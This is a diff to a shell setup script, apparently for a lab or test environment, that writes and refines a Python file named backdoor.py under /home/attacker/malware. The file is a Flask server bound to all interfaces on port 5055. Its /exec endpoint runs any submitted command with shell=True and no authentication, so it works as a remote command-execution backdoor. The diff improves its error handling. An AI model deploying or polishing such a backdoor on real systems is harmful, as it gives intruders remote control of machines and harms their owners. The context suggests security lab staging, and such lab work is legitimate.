@@ -135,19 +135,21 @@ pip3 install --break-system-packages flask flask-cors requests
 mkdir -p /home/attacker/malware
 cat > /home/attacker/malware/backdoor.py << 'EOF'
 #!/usr/bin/env python3
+import subprocess
 from flask import Flask, request
 app = Flask(__name__)
 @app.route("/exec", methods=["POST"])
 def exec_cmd():
- import subprocess
  cmd = request.form.get("cmd")
  if not cmd:
   return "No command", 400
  try:
   output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
   return output
- except Exception as e:
-  return str(e), 500
+ except subprocess.CalledProcessError as error:
+  return error.output or str(error), 500
+ except subprocess.TimeoutExpired as error:
+  return str(error), 504
 if __name__ == "__main__":
  app.run(host="0.0.0.0", port=5055)
 EOF
